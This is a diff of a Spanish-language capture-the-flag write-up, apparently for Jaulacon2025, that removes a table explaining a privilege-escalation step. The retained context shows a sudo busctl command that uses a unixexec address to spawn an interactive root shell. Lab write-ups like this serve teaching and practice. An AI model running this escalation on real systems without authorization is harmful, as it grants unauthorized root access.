@@ -253,11 +253,6 @@ sudo -l
 sudo -u root /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
 ```
  
-| Fragmento | Función |
-|---|---|
-| `set-property ... LogLevel s debug` | Llamada D-Bus cualquiera, solo se usa como excusa para forzar la conexión |
-| `--address=unixexec:path=/bin/sh,...` | Fuerza a `busctl` a "conectarse" ejecutando `/bin/sh` en lugar de hablar con el bus real, heredando los privilegios de root con los que corre `busctl` por sudo |
- 
 → Shell interactiva como root
  
 ## 6.2 Primera flag (Jaulacon2025)
